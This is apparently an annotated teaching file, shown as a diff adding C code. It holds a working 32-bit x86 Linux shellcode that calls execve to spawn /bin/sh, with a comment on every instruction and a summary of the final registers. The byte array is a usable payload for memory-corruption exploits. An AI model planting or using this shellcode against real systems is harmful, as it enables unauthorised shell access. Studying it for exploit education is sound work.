@@ -1,0 +1,53 @@
+/*
+    32-bit Linux (x86) Shellcode
+    Goal: execute /bin/sh using execve system call
+*/
+
+unsigned char shellcode[] =
+
+"\x6a\x0b"      /* push 0xb
+                   Push value 11 onto the stack (execve syscall number) */
+
+"\x58"          /* pop eax
+                   Pop the value into EAX → EAX = 11 */
+
+"\x99"          /* cdq
+                   Set EDX = 0 (used for envp = NULL) */
+
+"\x52"          /* push edx
+                   Push 0 onto the stack (NULL terminator for string) */
+
+"\x68\x2f\x2f\x73\x68"  /* push "//sh"
+                           Push "//sh" onto the stack */
+
+"\x68\x2f\x62\x69\x6e"  /* push "/bin"
+                           Push "/bin" onto the stack
+                           Now stack contains "/bin//sh" */
+
+"\x89\xe3"      /* mov ebx, esp
+                   EBX now points to "/bin//sh" (filename argument) */
+
+"\x31\xc9"      /* xor ecx, ecx
+                   Set ECX = 0 (argv = NULL) */
+
+"\xcd\x80";     /* int 0x80
+                   Trigger system call → execve("/bin/sh", NULL, NULL) */
+
+
+/*
+---------------------------------------------------------
+Final Register State Before syscall:
+
+EAX = 11                  → syscall number (execve)
+EBX = pointer to "/bin/sh" → first argument (filename)
+ECX = 0                   → second argument (argv = NULL)
+EDX = 0                   → third argument (envp = NULL)
+
+---------------------------------------------------------
+Final Result:
+
+execve("/bin/sh", NULL, NULL);
+
+→ A shell is spawned
+---------------------------------------------------------
+*/
